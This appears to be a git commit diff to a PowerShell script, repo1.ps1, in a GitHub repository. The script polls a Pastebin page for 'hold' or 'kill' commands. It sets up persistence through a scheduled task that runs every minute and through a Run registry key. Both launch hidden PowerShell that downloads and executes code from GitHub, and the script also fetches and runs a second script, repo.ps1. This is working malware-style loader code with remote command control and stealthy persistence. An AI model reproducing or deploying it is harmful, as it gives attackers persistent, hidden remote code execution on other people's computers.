16353c74f3b305c31d29ada5a9b2a93992f47750
rindonbrg <140368244+rindonbrg@users.noreply.github.com>
2023-07-26 22:35:56 -0700

    1

--- repo1.ps1
+++ repo1.ps1
@@ -1,18 +1,17 @@
-$re = (IWR "https://pastebin.com/raw/MXcGBCqS")
+$response = IWR 'https://pastebin.com/raw/Wy2fMXaw'
 
-if ($re -match 'hold') {
+if ($response.Content -match 'hold') {
     Exit
 }
 
-if ($re -match 'kill') {
+if ($response.Content -match 'kill') {
     schtasks /Delete /TN "Start" /f
     reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
     Exit
 }
 
-
 schtasks /Create /TN "Start" /SC MINUTE /MO 1 /TR "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)""" /F
 
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)\""" /F
 
-IEX "IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo.ps1 -UseBasicParsing); repo $re"
+$re = (IWR "https://pastebin.com/raw/MXcGBCqS"); IEX "IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo.ps1 -UseBasicParsing); repo $re"
